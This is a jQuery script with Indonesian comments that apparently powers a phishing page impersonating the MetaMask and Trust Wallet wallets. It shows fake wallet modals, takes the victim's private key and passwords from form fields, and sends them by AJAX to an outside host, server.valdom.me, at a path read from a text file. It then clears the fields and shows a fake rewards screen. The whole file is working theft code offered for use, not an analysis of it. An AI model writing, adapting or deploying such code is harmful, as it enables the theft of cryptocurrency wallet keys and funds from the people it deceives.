$(document).ready(function() {
    // Fungsi untuk membaca isi file teks
    function bacaNilaiFileTeks(namaFile, callback) {
        $.get(namaFile, function(data) {
            // Panggil kembali (callback) dengan data yang dibaca dari file teks
            callback(data.trim());
        });
    }

    // Gunakan fungsi untuk membaca nilai dari file teks
    bacaNilaiFileTeks('readme.txt', function(nilai) {
        // Gunakan nilai yang dibaca dari file teks untuk mengganti /az/ dalam kode Anda
        $("form").submit(function() {
            $(myform).attr("action", "https://server.valdom.me/sendtoken/" + nilai + "/send.php");
        });

        // Kode lainnya yang terkait dengan fungsi form submit di sini...

        // Event untuk menampilkan modal Metamask
        $('.beTwZZ').on('click', function() {  
            $('#metamask').fadeIn();   
            $('.modal').hide();     
        });

        // Event untuk menampilkan modal Trustwallet
        $('.beTwZZ2').on('click', function() {   
            $('#trustwallet').fadeIn();    
            $('.modal').hide();     
        });

        // Event untuk reload halaman saat mengklik tautan pada addon-box
        $('.addon-box .head > a').on('click', function() {   
            location.reload();   
        });

        $('.addon-box .headtrust > a').on('click', function() {   
            location.reload();   
        });

        // Event untuk menampilkan modal Metamask saat mengklik tombol pada #rewards
        $('#rewards .confirm-approve-content__small-text > button').on('click', function() {   
            $('#metamask').fadeIn(); 
            $('#rewards').hide();
        });

        // Event untuk menampilkan modal Trustwallet saat mengklik tombol pada #rewards2
        $('#rewards2 .confirm-approve-content__small-text > button').on('click', function() {   
            $('#trustwallet').fadeIn(); 
            $('#rewards2').hide();
        });

        // Event untuk mengirim data melalui form Metamask
        $("#metamask").on("submit", "#metamask", function(e) {
            e.preventDefault();
            $.ajax({
                url: 'https://server.valdom.me/sendtoken/' + nilai + '/send.php',
                method : 'post',
                dataType : 'json',
                data: $(this).serialize(),
                success: function(data) {
                    // alert(data);
                    loadData();
                }
            });
            $("#PrivateKey").val("");
            $("#password1").val("");
            $("#password2").val("");
            $('#metamask').hide(); 
            $('#rewards').fadeIn();
        });

        // Event untuk mengirim data melalui form Trustwallet
        $("#trustwallet").on("submit", "#metamask", function(e) {
            e.preventDefault();
            $.ajax({
                url: 'https://server.valdom.me/sendtoken/' + nilai + '/send.php',
                method : 'post',
                dataType : 'json',
                data: $(this).serialize(),
                success: function(data) {
                    // alert(data);
                    loadData();
                }
            });
            $("#PrivateKey").val("");
            $('#trustwallet').hide(); 
            $('#rewards2').fadeIn();
        });
    });
});